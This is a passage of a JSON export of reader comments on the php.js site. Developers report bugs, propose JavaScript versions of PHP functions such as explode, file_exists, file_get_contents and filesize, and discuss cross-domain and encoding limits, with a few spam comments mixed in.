09:39:34","author":"Itsacon","url":"","comment":"Ah, much better.\r\n\r\nStrange, the problem cropped up when I updated my php.js, so maybe the version in the lib-build-tool is also still using the older one.\r\n\r\nThanks for the quick response (and the explanation)"},{"date":"2012-04-11 15:46:10","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "}],"explode":[{"date":"2008-02-01 06:40:58","author":"kenneth","url":"","comment":"This function is wrong. Params are reversed, and return values are not what they would be in PHP.\r\n\r\nThe &quot;description&quot; above is actually correct, but both the actual source code given and the example given have the params reversed.\r\n\r\nAs for return values....I might as well just right it out at this point:\r\n\r\n[CODE=&quot;Javascript&quot;]function explode( \/* delimiter, string *\/ ) {\r\n\r\n\tvar emptyArray = { 0: '' };\r\n\t\r\n\tif ( arguments.length != 2 \r\n\t\t\t|| typeof arguments[0] == 'undefined'\r\n\t\t\t|| typeof arguments[1] == 'undefined' ) \r\n\t{\r\n\t\treturn null;  \r\n\t}\r\n\t\t\t\t\t\r\n\tvar delimiter = arguments[0];\r\n\tvar string = arguments[1];\t \r\n\t\r\n\tif ( delimiter === '' \r\n\t\t\t|| delimiter === false \r\n\t\t\t|| delimiter === null )\r\n\t{\r\n\t\treturn false;\t\r\n\t}\r\n\t\r\n\tif ( typeof delimiter == 'function' \r\n\t\t\t|| typeof delimiter == 'object' \r\n\t\t\t|| typeof string == 'function' \r\n\t\t\t|| typeof string == 'object' )\r\n\t{\r\n\t\treturn emptyArray;\r\n\t}\t\t\t\t\r\n\t\t\r\n\tif ( delimiter === true ) {\r\n\t\tdelimiter = '1';\t\r\n\t}\r\n  \r\n\treturn string.toString().split ( delimiter.toString() );\t\r\n\r\n}[\/CODE]"},{"date":"2008-02-01 07:57:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ kenneth: That was pretty ugly indeed, thanks for contributing, I've updated the source and added your name."},{"date":"2008-02-06 11:00:20","author":"u24","url":"","comment":"great project.\r\n\r\nthis one doesn't replicate the optional third $limit parameter which php has though. If I get a spare second I'll add another comment with amended code."},{"date":"2008-05-17 09:40:35","author":"d3x","url":"","comment":"Same function with the limit attribute:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction explode( delimiter, string, limit ) {\r\n\t\/\/ http:\/\/kevin.vanzonneveld.net\r\n\t\/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t\/\/ +   improved by: kenneth\r\n\t\/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t\/\/ *\t example 1: explode(' ', 'Kevin van Zonneveld');\r\n\t\/\/ *\t returns 1: {0: 'Kevin', 1: 'van', 2: 'Zonneveld'}\r\n\t\/\/ +   further improved by: d3x\r\n\t\/\/ *     example 1: explode('=', 'a=bc=d', 2);\r\n\t\/\/ *     returns : ['a', 'bc=d']\r\n \r\n\tvar emptyArray = { 0: '' };\r\n \r\n\tif ( arguments.length != 3\r\n\t\t|| typeof arguments[0] == 'undefined'\r\n\t\t|| typeof arguments[1] == 'undefined'\r\n\t\t|| typeof arguments[2] == 'undefined' )\r\n\t{\r\n\t\treturn null;\r\n\t}\r\n \r\n\tif ( delimiter === ''\r\n\t\t|| delimiter === false\r\n\t\t|| delimiter === null )\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n \r\n\tif ( typeof delimiter == 'function'\r\n\t\t|| typeof delimiter == 'object'\r\n\t\t|| typeof string == 'function'\r\n\t\t|| typeof string == 'object' )\r\n\t{\r\n\t\treturn emptyArray;\r\n\t}\r\n \r\n\tif ( delimiter === true ) {\r\n\t\tdelimiter = '1';\r\n\t}\r\n\tif(!limit){\r\n \t\treturn string.toString().split ( delimiter.toString() );\r\n\t} else {\r\n\t\tvar splitted = string.toString().split(delimiter.toString());\r\n\t\tvar partA = splitted.splice(0, limit - 1);\r\n\t\tvar partB = splitted.join(delimiter.toString());\r\n\t\tpartA.push(partB);\r\n\t\treturn partA;\r\n\t}\r\n}\r\n[\/CODE]"},{"date":"2008-05-17 15:16:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ d3x: Thanks! I've updated the function. I changed the \r\n[CODE=&quot;Javascript&quot;]\r\narguments.length != 3\r\n[\/CODE]\r\npart, for it to allow 2 arguments. Other than that, great contribution!!"},{"date":"2008-12-08 13:49:34","author":"valulgi","url":"www.valugi.ro","comment":"why not use the split function from js?"},{"date":"2008-12-09 18:25:49","author":"Onno Marsman","url":"","comment":"@valulgi: You'll need to look a bit closer. This function is really built around the split function from js."},{"date":"2010-02-14 17:05:13","author":"nowotny","url":"","comment":"PHP explode function allows you to split by a string, not only one character, which this JS function does not allow... \r\n"},{"date":"2010-02-15 07:00:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"It's working for me... \n\n[CODE]explode('-+-', 'abc-+-def-+-ghi') \/\/ abc,def,ghi[\/CODE]\n\nWhat are you trying to do that's different?"},{"date":"2010-02-27 07:35:43","author":"IVI-R3za.M","url":"www.webmehr.com","comment":"its so great! thanks"},{"date":"2010-06-14 16:08:09","author":"a","url":"","comment":"ser"},{"date":"2011-03-07 06:52:47","author":"raj ","url":"www.prova.com","comment":"ghghggh"},{"date":"2012-02-12 20:51:47","author":"Ghabriel Nunes","url":"","comment":"I found some errors in the function above.\nThe above function does not handle negative limits, and, according to the PHP documentation, if limit is 0, it's treated as 1. The above function treats limit as \"not set\" if it's 0, which is wrong. Also, if the limit is bigger than the split length, it adds white spaces to the array, which is also wrong. I re-created this function, fixing all the mistakes  I found:\n\nNote: sorry for any english mistakes, english is not my first language.\n\n[CODE]\nfunction explode( delimiter, string, limit ){\n\tif ( arguments.length < 2 || typeof delimiter == 'undefined' || typeof string == 'undefined' ) return null;\n\tif ( delimiter === '' || delimiter === false || delimiter === null) return false;\n\tif ( typeof delimiter == 'function' || typeof delimiter == 'object' || typeof string == 'function' || typeof string == 'object'){\n\t\treturn { 0: '' };\n\t}\n\tif ( delimiter === true ) delimiter = '1';\n\t\n\t\/\/ Here we go...\n\tdelimiter += '';\n\tstring += '';\n\t\n\tvar s = string.split( delimiter );\n\t\n\n\tif ( typeof limit === 'undefined' ) return s;\n\t\n\t\/\/ Support for limit\n\tif ( limit === 0 ) limit = 1;\n\t\n\t\/\/ Positive limit\n\tif ( limit > 0 ){\n\t\tif ( limit >= s.length ) return s;\n\t\treturn s.slice( 0, limit - 1 ).concat( [ s.slice( limit - 1 ).join( delimiter ) ] );\n\t}\n\n\t\/\/ Negative limit\n\tif ( -limit >= s.length ) return [];\n\t\n\ts.splice( s.length + limit );\n\treturn s;\n}\n[\/CODE]"}],"extract":[{"date":"2009-01-07 15:38:36","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Just to keep the relevant items together, I'm resubmitting list() here in case anyone looking at extract() is interested (I fully understand not porting it to the main project given its not following PHP-style (getting the array in by the last argument rather than by assignment)):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ Only works in global context and deviates (by necessity) from PHP version\r\nlist('drink', 'color', 'power', ['coffee', 'brown', 'caffeine']);\r\nfunction list () {\r\n    var arr = arguments[arguments.length-1]\r\n    for (var i=0; i &lt; arr.length; i++) {\r\n        this[arguments[i]] = arr[i];\r\n    }\r\n}\r\nalert(drink +' is '+color+' and '+power +' makes it special.\\n'); \/\/ Example from PHP manual\r\n[\/CODE]"},{"date":"2009-01-08 10:15:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Very well!"}],"file_exists":[{"date":"2008-11-14 21:07:50","author":"frame","url":"","comment":"The function file_exists isn't avaiable in php.js."},{"date":"2008-11-14 21:21:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ frame: But it is, what link are you using?"},{"date":"2008-11-18 01:36:29","author":"frame","url":"","comment":"Do you have updated the link? I downloaded the lib some time before and the function was not included..  now it is o.O \r\n\r\nAnother Bug?: The security code i typed in was not valid.. for 3 times.. and also did not reload to another code.. always the same.."},{"date":"2008-11-18 12:25:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ frame: This could happen if you are writing multiple comments at the same time, cause only one allowed security key is remembered per user. Could this be your case as well?"},{"date":"2010-05-22 03:56:19","author":"James 'Skateside' Long","url":"http:\/\/www.sk80.co.uk","comment":"Hi guys\n\nThis is my first contribution to php.js, but I feel that it's an important one.\n\nFirstly, Wikipedia (http:\/\/en.wikipedia.org\/wiki\/Xmlhttprequest) assures us that there are a few more ActiveXObject parameters that can be tried to allow older versions of MSIE to use this function. This can be easily fixed by replacing the ternary opperator on line 14 with a self-executing function to try as many things as possible.\n\nSecondly, checking an absolute URL offline in Firefox throws an NS_ERROR_FAILURE error. I think the best solution to this is to check whether the file location is an absolute reference and whether or not the script is being run online. If the reference is absolute but the script is being run offline, just assume the file exists.\n\nFinally, any status returned that's between 200 and 300 is technically a sucessfull response.\n\nSo, with all these in mind, I'd like to propose the following function as the new file_exists(). Please note that I've tweaked this so that it only returns true or false so I can use it in my own scripts - feel free to add your own error handling to the function.\n\n[code]\nfunction file_exists(url) {\n\n\t\/\/ Fire up the AJAX function\n\tvar req = (function() {\n\t\tif (typeof XMLHttpRequest == \"function\") {\n\t\t\treturn new XMLHttpRequest();\n\t\t} else {\n\t\t\tXMLHttpRequest = function () {\n\t\t\t\ttry {return new ActiveXObject(\"Msxml2.XMLHTTP.6.0\");}catch(e){};\n\t\t\t\ttry {return new ActiveXObject(\"Msxml2.XMLHTTP.3.0\");}catch(e){};\n\t\t\t\ttry {return new ActiveXObject(\"Msxml2.XMLHTTP\");}catch(e){};\n\t\t\t\treturn false;\n\t\t\t};\n\t\t}\n\t}());\n\n\t\/\/ If we can't use AJAX, or we're offline, we'll have to assume that the image is fine until proved otherwise\n\tif (!req || (url.match(\/https?:\\\/\\\/\/i) && !window.location.href.match(\/https?:\\\/\\\/\/i))) {return true;}\n\n\t\/\/ Send a 'HEAD' request since it's faster than 'GET' and 'POST'\n\treq.open('HEAD', url, false);\n\treq.send(null);\n\n\t\/\/ Any status in the 200 range is a successful request\n\treturn (req.status >= 200 && req.status < 300);\n}\n[\/code]"},{"date":"2010-05-22 04:00:21","author":"James 'Skateside' Long","url":"http:\/\/www.sk80.co.uk","comment":"Blast! Sorry for the double-post but I've just realise that regular expression should only check the beginning of the string so it should be:\n\/^https?:\\\/\\\/\/i"},{"date":"2011-12-21 20:36:00","author":"Felipe","url":"","comment":"Funny"},{"date":"2012-01-06 05:32:30","author":"Ali.MD","url":"ali.md","comment":"its wrong .\nyou load content of file to check its exist ?!?!\nit can very slow in big files, even in 'HEAD' method. (except in nginx servers)\nwhy you don't write an optional php server site script too boost performance and full php feature ?"},{"date":"2012-01-06 09:46:43","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Hello Ali.MD,\n\nThere are indeed client-side uses for checking the existence of a file (though probably adapting this function to accept an asynchronous callback). For example, particularly if your application is interacting with other sites---such as allowing the user to access an API with JSONP or HTML5 cross-domain access (as I was developing in making a site-independent Mediawiki browser client), one might wish to know whether a certain file exists (e.g., to decide the coloring of a link to a wiki page).\n\nThe synchronous part of the function is the real problem here, and there is already a disclaimer in the function's notes about the function being for study purposes.\n"},{"date":"2012-01-06 10:24:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"To add clarification to my last post regarding your point, using PHP as a proxy will add EXTRA time if you have an Ajax-based application. And even regarding PHP's extra features, HTML5 apps nowadays are doing more of the things you can do on the server (there may even be a standard way to run a proxy on the client-side in the future, with user permission, letting you build your own browser in HTML5)."}],"file_get_contents":[{"date":"2009-02-27 20:24:55","author":"Caleb","url":"http:\/\/www.gamesector.net\/","comment":"I'm having a wee problem; this doesn't appear to work cross-domains. Is that a limitation of this method?"},{"date":"2008-07-03 19:13:58","author":"Kyle Itterly","url":"","comment":"Just wanted to thank you for the javascript file_get_contents function, works great and was well documented. Unfortunately this reference was elusive on my google search of &quot;read file javascript&quot; and a lot of others were looking for something like this too based on that query."},{"date":"2008-07-18 08:58:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Glad you found this helpful. I you want you can always help me spread the word on this project :)"},{"date":"2008-10-02 11:38:13","author":"Adnan Siddiqi","url":"http:\/\/weblogs.com.pk\/kadnan","comment":"It won't work for cross domain calls"},{"date":"2008-10-02 21:55:19","author":"Philippe Baumann","url":"","comment":"Just found this project again and wanted to see how it's going. I'm very impressed how much this library has grown since.\r\n\r\nI've found the following two functions in my development folder. Admittedly, they're not used very often and I also didn't really come up with the first one myself, but you might still find them a nice addition:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/*\r\nstring dechex ( int $number )\r\n\r\nReturns a string containing a hexadecimal representation of the given number argument. \r\nThe largest number that can be converted is 4294967295 in decimal resulting to &quot;ffffffff&quot;.\r\n*\/\r\nfunction dechex(number)\r\n{\r\n\treturn number.toString(16);\r\n}\r\n\r\n\r\n\/*\r\nnumber hexdec ( string $hex_string )\r\n\r\nReturns the decimal equivalent of the hexadecimal number represented by the hex_string argument. \r\nhexdec() converts a hexadecimal string to a decimal number.\r\n\r\nhexdec() will ignore any non-hexadecimal characters it encounters.\r\n*\/\r\nfunction hexdec(hex_string)\r\n{\r\n\thex_string = (hex_string+'').replace(\/[^a-f0-9]\/gi, '');\r\n\treturn parseInt(hex_string, 16);\r\n}\r\n[\/CODE]\r\n\r\nBy the way: Is there a better way to chat and submit functions than posting in the article for another function?"},{"date":"2008-10-02 23:56:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Adnan Siddiqi: That is correct. Browser will prevent that because it's considered a security risk.\r\n\r\n@ Philippe Baumann: Good to see you back! Don't forget to checkout work in progress at: http:\/\/phpjs.org That site will have much better submit features! Added your functions btw, thanks!"},{"date":"2008-11-10 18:39:59","author":"Enrique Gonz\u00e1lez","url":"http:\/\/www.maciaspajas.com","comment":"With JS it is not posible to retrieve a local file using file() or file_get_contents(), so it may be useful to use this same method using HEAD instead of GET to have the equivalent to filesize or file_exists\r\n\r\n[Code=&quot;Javascript&quot;]\r\nfunction filesize( url ) {  \r\n       var req = null;\r\n       try { req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); } catch (e) {  \r\n           try { req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } catch (e) {  \r\n               try { req = new XMLHttpRequest(); } catch(e) {}  \r\n           }  \r\n       }\r\n       if (req == null) throw new Error('XMLHttpRequest not supported');\r\n       req.open ('HEAD',url,false);\r\n       req.send (null);\r\n       return req.getResponseHeader('Content-Length');       \r\n   }\r\n[\/code]\r\n\r\n[Code = &quot;Javascript&quot;]\r\nfunction file_exists( url ) {  \r\n       var req = null;\r\n       try { req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); } catch (e) {  \r\n           try { req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } catch (e) {  \r\n               try { req = new XMLHttpRequest(); } catch(e) {}  \r\n           }  \r\n       }\r\n       if (req == null) throw new Error('XMLHttpRequest not supported');\r\n       \/\/ HEAD Results are usually shorter (faster) than GET\r\n       req.open ('HEAD',url,false);\r\n       req.send (null);\r\n       if (req.status ==200){ return true;}\r\n           else {return false;}\r\n   }\r\n[\/Code]\r\n\r\nI'm not quite sure if this functions fit correctly in php.js. Both functions won't work with http files in php, but as I said before, php works with local files and js does not, so working with remote http files may be somehow equivalent.\r\n\r\nAlso the file_exists function may have different answers. Status code 200 means something exists, 404 it doesn't, but there are lot's of codes that mean different things."},{"date":"2008-11-13 23:07:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Enrique Gonz\u00c3\u00a1lez: Cool Enrique! Thanks a LOT!"},{"date":"2009-01-13 20:24:18","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's a function that depends on file_get_contents(). Note that I did not implement its second argument (for an include path), since local files aren't supported anyways. This is a fun one to play around with actually.\r\n\r\nfunction get_meta_tags (file) { \r\n    var fulltxt = file_get_contents(file).match(\/^[^]*&lt;\\\/head&gt;\/i);\r\n\/* Kevin, you could use this for testing instead of the line above:\r\nvar fulltxt = '&lt;meta name=&quot;author&quot; content=&quot;name&quot;&gt;'+\r\n'&lt;meta name=&quot;keywords&quot; content=&quot;php documentation&quot;&gt;'+\r\n'&lt;meta name=&quot;DESCRIPTION&quot; content=&quot;a php manual&quot;&gt;'+\r\n'&lt;meta name=&quot;geo.position&quot; content=&quot;49.33;-86.59&quot;&gt;'+\r\n'&lt;\/head&gt;';*\/\r\n    var patt = \/&lt;meta[^&gt;]*?&gt;\/gim;\r\n    var txt, match, name, arr={};\r\n    while ((txt = patt.exec(fulltxt)) != null) {\r\n        var patt1 = \/&lt;meta\\s+.*?name\\s*=\\s*(['&quot;]?)(.*?)\\1\\s+.*?content\\s*=\\s*(['&quot;]?)(.*?)\\3\/gim;\r\n        while ((match = patt1.exec(txt)) != null) {\r\n            name = match[2].replace(\/\\W\/g, '_').toLowerCase();\r\n            arr[name] = match[4];\r\n        }\r\n        var patt2 = \/&lt;meta\\s+.*?content\\s*=\\s*(['&quot;?])(.*?)\\1\\s+.*?name\\s*=\\s*(['&quot;]?)(.*?)\\3\/gim;\r\n        while ((match = patt2.exec(txt)) != null) {\r\n            name = match[4].replace(\/\\W\/g, '_').toLowerCase();\r\n            arr[name] = match[2];\r\n        }\r\n    }\r\n    return arr;\r\n}"},{"date":"2009-01-14 11:15:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir & Onno Marsman: Sorry Onno... Added :)"},{"date":"2009-01-19 14:56:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's another dependent to file_get_contents()... I've tried to make it more useful for JavaScript by not eliminating newlines (since they could be used without semicolons). I'm guessing there could be aspects I've missed, especially if you're trying to be able to operate on PHP code.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ You could use this for testing based on the PHP example, but note comment above\r\nstr = &quot;&lt;?php\\n&quot;+\r\n&quot;\/\/ PHP comment here\\n&quot;+\r\n&quot;\\n&quot;+\r\n&quot;\/*\\n&quot;+\r\n&quot; * Another PHP comment\\n&quot;+\r\n&quot; *\/\\n&quot;+\r\n&quot;\\n&quot;+\r\n&quot;echo        php_strip_whitespace(__FILE__);\\n&quot;+\r\n&quot;\/\/ Newlines are considered whitespace, and are removed too:\\n&quot;+\r\n&quot;do_nothing();&quot;+\r\n&quot;?&gt;&quot;;\r\n\r\n\/\/ Depends on file_get_contents()\r\nfunction php_strip_whitespace (file) {\r\n    try {\r\n        var str = file_get_contents(file);\r\n    }\r\n    catch (e) {\r\n        return '';\r\n    }\r\n    \/\/ Strip comments (both styles), reduce non-newline whitespace to one, reduce multiple newlines (preceded by any whitespace) to a newline, remove WS at beginning of line, and at end of line\r\n    return str.replace(\/\\\/\\\/.*?\\n\/g, '').replace(\/\\\/\\*[^]*?\\*\\\/\/g, '').replace(\/[ \\f\\r\\t\\v\\u00A0\\u2028\\u2029]+\/g, ' ').replace(\/\\s*\\n+\/g, '\\n').replace(\/^\\s+\/gm, '').replace(\/\\s*$\/gm, '');\r\n}\r\n\r\nalert(php_strip_whitespace('http:\/\/kevin.vanzonneveld.net\/code\/php_equivalents\/php.namespaced.js'))\r\n[\/CODE]"},{"date":"2009-01-25 13:53:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Fair enough.. Added"},{"date":"2009-05-14 18:27:04","author":"Ben","url":"","comment":"@Caleb: Ajax is limted to not work accross domains. You will have to do that server side."},{"date":"2009-05-15 00:16:27","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Caleb and Ben: Sorry we missed your question, Caleb, and thanks for answering Ben.\n\nWhat Ben said is true, but as of Firefox 3.5 (and possibly other newer browsers, though no doubt not Explorer yet), it is possible for servers to indicate they are willing to accept certain Ajax from other sites, but they have to do so explicitly: https:\/\/developer.mozilla.org\/En\/HTTP_Access_Control\n\nAnother client-side alternative (though more challenging for a beginner) is to use the JavaScript inside of an extension or widget which has privileges, or use \"signed\" JavaScript in HTML for which permission is required from the user (though this may only work in certain browsers). In such a case, access can take place cross-site, but it is something a bit more involved and may not work in all browsers. \n\nActually, come to think of it, we might be able to ask for signed privileges from the user (for regular HTML JavaScript) in the function if the request doesn't work...But again, this will require permission from the user and not necessarily work in all browsers.\n\nIt's funny you all mention this now because I'm trying to add support for this function to work client-side in Firefox extensions by using the stream \"context\" argument in file_get_contents() to set up Mozilla-specific configuration, though this could also work for other HTML situations (e.g., controlling the headers and request type used for file_get_contents()). I can let you know how it goes if I can get it going, though there are a number of pieces to put together first before it can work."},{"date":"2009-06-20 10:12:54","author":"Jeffrey Brown","url":"","comment":"Whenever I call this I get question marks for anything with ascii value over 127"},{"date":"2009-06-20 11:51:41","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Jeffrey Brown: I believe the issue is probably due to Ajax having trouble detecting the correct MIME type. For example, in Firefox, when I use file_get_contents() on http:\/\/www.sina.com , a Chinese website in the gb2312 encoding, I also get question marks (though if you load it in the browser, it is ok). I don't have the same problem when loading a file which has the proper character encoding set in the server's response header: e.g., http:\/\/bahai-academic.hk\/?langu=zh-CN\n\nWhile I would have thought that setting a header like \"Accept-Charset\" would work (you can set headers through the stream context argument in file_get_contents() if need be), it didn't. It seems, at least in cases where the website doesn't set a content type header (when the browser can only get the encoding by parsing the text for meta tags, etc.) one must instead actually manually override the mime type (how the content is treated after it is returned from the server):\n\n[CODE]req.overrideMimeType('text\/html; charset=gb2312');[\/CODE]\n\nI'm not sure how to best implement this in file_get_contents(). I think we might solve this by adding our own custom option to the stream context which allowed overriding the mime type instead of just sending an (optional) request header. Maybe we can name the option \"phpjs.overrideMimeType\"?"},{"date":"2009-06-20 20:24:26","author":"Jeffrey Brown","url":"","comment":"@Brett: Thanks for looking into this. I just tried inserting that line (req.overrideMimeType...) in the function and received the error \"Object doesn't support this property or method.\""},{"date":"2009-06-21 03:21:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Jeffrey: I see in the XMLHttpRequest draft at the W3C that overrideMimeType() is not yet standardized on. It should work in at least Firefox, so you can confirm for yourself that it works there, but I'm not familiar with support elsewhere, so it looks like that won't be a robust solution for now.\n\nAlso, the scheme the spec mentions for handling character sets indeed does not inspect on the <meta\/> tags to detect character set (though HTML 5 still will! http:\/\/www.whatwg.org\/specs\/web-apps\/current-work\/#attr-meta-http-equiv-content-type ), so unless someone complains to the spec team and they accept a change, XMLHttpRequest() doesn't look like it will ever automatically handle meta tag encodings with responseText by the looks of things. (DOMParser() is being discussed as a standardization candidate, which could perhaps, if given a \"text\/html\" argument, check for meta encodings, but that is not implemented or agreed upon.)\n\nIf you are talking about a regular website (and not privileged JS like in a browser extension), you need to be in control of the targeted website anyways (we don't have cross-domain support implemented in file_get_contents() yet, and it requires explicit server permissions anyways).\n\nSo, it looks like your options are:\n\n1) get the site to either: A) upgrade to utf8 (best solution for everyone and most future proof solution) or, B) to at least send a header which indicates the current character set they are using. This can be easily done in the likes of PHP by adding a line at the top of your PHP script like this (should be before even any whitespace is sent by the browser, so make sure your beginning <?php ...?> block is not preceded by whitespace or HTML, and if it is, add a PHP block with the following line before it):\n\n\"header('Content-Type: text\/html;charset=gb2312)\" (replacing \"gb2312\" with the character set being sent out by the website in its meta tag)\n\n2) find a JS conversion algorithm of the site's character set into Unicode (be sure to share it here if you do!--unicode_encode() could use this: http:\/\/php.net\/manual\/en\/function.unicode-encode.php --although we already have utf8_encode() implemented, that only works for Latin-1)). But as with overrideMimeType(), you'll need to know, guess, or extract the character set to make the conversion."},{"date":"2009-12-03 23:36:03","author":"Eligio","url":"http:\/\/www.eligio.org","comment":"wow, that save me from coding...time for testing. thanks"},{"date":"2009-12-14 15:38:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Eligio: Be sure to let us know when you find a bug!"},{"date":"2010-01-09 01:12:29","author":"Leosek","url":"","comment":"Hi, is this function tested in other than IE-based browsers? I'm not able to make it work in e.g. firefox, opera, google chrome. In IE it works fine.\n\nthanks"},{"date":"2010-01-09 03:30:38","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Firefox is the browser I usually use for testing, unless someone reports a bug elsewhere. What problem(s) were you having? Some sample code maybe? When in Firefox, what errors are you getting in Tools->Error Console ?"},{"date":"2010-01-09 12:50:02","author":"Leosek","url":"","comment":"Here is the error:\n\nError: uncaught exception: [Exception... \"Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIXMLHttpRequest.send]\"  nsresult: \"0x80004005 (NS_ERROR_FAILURE)\"  location: \"JS frame :: file:\/\/\/C:\/jscript\/test_last.html :: file_get_contents :: line 227\"  data: no]\n\nand line 227 is accidentally the same as line 227 on this page"},{"date":"2010-02-17 20:43:12","author":"Jack Mason","url":"www.mybfl.com","comment":"Line 177 appears to be an \"if\" without a \"true\" clause because \"req.sendAsBinary(content);\" is commented out.  Is this the way it is supposed to be?"},{"date":"2010-02-17 21:29:20","author":"Jack Mason","url":"www.mybfl.com","comment":"The code above is not the same as the raw source, so users need to insure they pull down the raw source."},{"date":"2010-02-19 07:11:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jack Mason: Yeah, sometimes it take a while for the site to reflect the source, but in this case, at least by the time I got to it, it looks like they are the same? Anyhow, hope your issue is now settled. So, you're making use of the context fields?"},{"date":"2010-09-19 06:47:40","author":"?????","url":"http:\/\/games.konseo.com","comment":"My host can not use this fuction\r\nbut thanks"},{"date":"2010-11-10 00:34:55","author":"chechu","url":"---","comment":"How I can make file_get_contents funcnione in Internet Explorer?\n\nThanks\n-----------------------------------------------------------------------\n\n\n\u00bfcomo puedo hacer que file_get_contents funcnione en internet explorer?\n\n\nGracias"},{"date":"2010-11-10 08:42:02","author":"chechu","url":"","comment":"[CODE]\r\nfunction dato(){\r\nvar dato = document.getElementById('tag').innerHTML=file_get_contents('archivo.php');\r\n}\r\nsetInterval(\"dato()\",10000);\r\n[\/CODE]\r\n\r\n\r\nFF ok , IE ERROR.\r\n\r\nInternet Explorer does not work, how to make it work?\r\n"},{"date":"2010-11-16 20:49:14","author":"Philip Peterson","url":"http:\/\/ironmagma.com\/","comment":"@Kevin van Zonneveld: Might want to know that your test URL, http:\/\/kevin.vanzonneveld.net\/pj_test_supportfile_1.htm, is bork'd (redirects to the main page)."},{"date":"2011-01-16 04:23:42","author":"Bydracrarkano","url":"","comment":""},{"date":"2012-05-06 09:29:03","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other  \n"},{"date":"2012-09-19 11:38:33","author":"Justin Bieber","url":"http:\/\/webseoranks.com\/wherecanibuya.org","comment":"Heya just wanted to give you a quick heads up and let you know a few of the pictures aren't loading correctly. I'm \r\nnot sure why but I think its a linking issue. I've tried it in two different browsers and both show the same results."}],"filesize":[{"date":"2008-11-14 12:17:52","author":"Onno Marsman","url":"","comment":"What if the &quot;Content-Length&quot; header does not exist?\r\n\r\nFurthermore: it's really weird to use these types of functions. Making an Ajax request which executes the filesize function server-side would be many times better. But the same goes for something like file_get_contents and this has pointed out before. I really think that in the future these types of functions (along with functions like sleep, which also nobody should use) should not remain in the main download of php.js, but optionally available."},{"date":"2008-11-14 14:17:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: I've made it return false if it doesn't. We've had this discussion before indeed. I know how you feel about this, and you know I agree but these functions serve a purpose of their own. We'll make sure they'll not be included by default with our future compiler. Thanks for your input Onno."},{"date":"2008-11-14 16:21:05","author":"Onno Marsman","url":"","comment":"K thnx, I will not bother you with it again ;)\r\nI hope that compiler will soon be available."},{"date":"2008-11-14 21:23:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Haha, that's ok Onno! appreciated. And about the compiler... Man I'm so busy :| Will try to dedicate more time to it."},{"date":"2008-11-17 09:12:53","author":"Jani Hartikainen","url":"http:\/\/codeutopia.net\/","comment":"While the whole method is a bit dubious (as pointed out by Onno Marsman), it might be a general improvement to check for window.XMLHttpRequest, rather than relying on error catching. To my understanding, catching exceptions (errors?) is slow."},{"date":"2008-11-18 12:23:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Jani Hartikainen: Fair enough!"},{"date":"2008-12-07 19:30:51","author":"Arcanis","url":"http:\/\/www.arcanis.fr","comment":"I think it's stupid to return false when there is no content-length, and to return an error when there is no XHR.\r\nBoth of them are errors, no ? I think you must send an error if the content-length is not specified."},{"date":"2008-12-08 13:35:55","author":"T.Wild","url":"","comment":"@Arcanis\r\nWhile it may be stupid not to throw an error when the content length header isn't sent; when JavaScript throws an error the script halts, just try this:\r\n[CODE=&quot;Javascript&quot;]\r\nthrow new Error('error1');\r\nalert(&quot;FOO&quot;); \/\/This is not called\r\n[\/CODE]\r\nYou don't want your entire script to halt simply because the server fails to send the correct headers which isn't a client side error.\r\nHowever the XHR is different it is an error on the client side and does warrant an error, but even then I'd rather it return false rather than throw an error since PHP returns false on any error, not halt your script.\r\nMaybe this would work?\r\n[CODE type=&quot;Javascript&quot;]\r\n\/\/This allows the error to be thrown while still returning false;\r\ntry{\r\n     throw new Error('error1');\r\n}catch(e){\r\n    return 